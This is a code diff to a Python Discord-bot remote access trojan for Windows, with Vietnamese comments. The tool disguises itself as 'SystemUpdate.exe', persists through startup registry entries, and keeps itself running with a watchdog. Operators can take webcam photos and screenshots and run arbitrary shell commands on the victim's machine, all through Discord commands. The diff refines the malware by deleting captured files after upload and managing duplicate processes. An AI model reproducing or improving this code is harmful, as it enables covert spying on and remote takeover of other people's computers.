@@ -1,7 +1,6 @@
-import ssl, aiohttp, discord, cv2, pyautogui, subprocess, os, sys, winreg, threading, time, secrets, base64, json, urllib.request, asyncio
+import ssl, aiohttp, discord, cv2, pyautogui, subprocess, os, sys, winreg, threading, time, secrets, base64, json, urllib.request, asyncio, psutil
 from discord.ext import commands
 
-# --- CẤU HÌNH ---
 TOKEN = ""
 PROCESS_NAME = "SystemUpdate.exe"
 
@@ -16,11 +15,22 @@ def add_to_startup():
     except: pass
 
 def watchdog():
+    # Kiểm tra số lượng tiến trình trùng lặp
+    current_pid = os.getpid()
     while True:
-        if PROCESS_NAME not in subprocess.getoutput('tasklist'):
+        count = 0
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] == PROCESS_NAME:
+                if proc.info['pid'] != current_pid:
+                    try:
+                        proc.terminate() # Giết các bản sao dư thừa
+                    except: pass
+                count += 1
+        
+        if count == 0:
             try: os.startfile(sys.executable)
             except: pass
-        time.sleep(5)
+        time.sleep(10)
 
 @bot.command()
 async def chupanh(ctx):
@@ -29,17 +39,19 @@ async def chupanh(ctx):
     if ret:
         cv2.imwrite("c.jpg", frame)
         await ctx.send(file=discord.File("c.jpg"))
+        os.remove("c.jpg")
     cam.release()
 
 @bot.command()
 async def chupmanhinh(ctx):
     pyautogui.screenshot("s.png")
     await ctx.send(file=discord.File("s.png"))
+    os.remove("s.png")
 
 @bot.command()
 async def cmd(ctx, *, command):
     result = subprocess.getoutput(command)
-    await ctx.send(f"\n{result[-1900:]}\n")
+    await ctx.send(f"```\n{result[-1900:]}\n```")
 
 @bot.command()
 async def buff(ctx, device_id: str, token: str):
@@ -62,8 +74,7 @@ async def huy(ctx):
 async def main():
     add_to_startup()
     threading.Thread(target=watchdog, daemon=True).start()
-    async with bot:
-        await bot.start(TOKEN)
+    await bot.start(TOKEN)
 
 if __name__ == "__main__":
     asyncio.run(main())
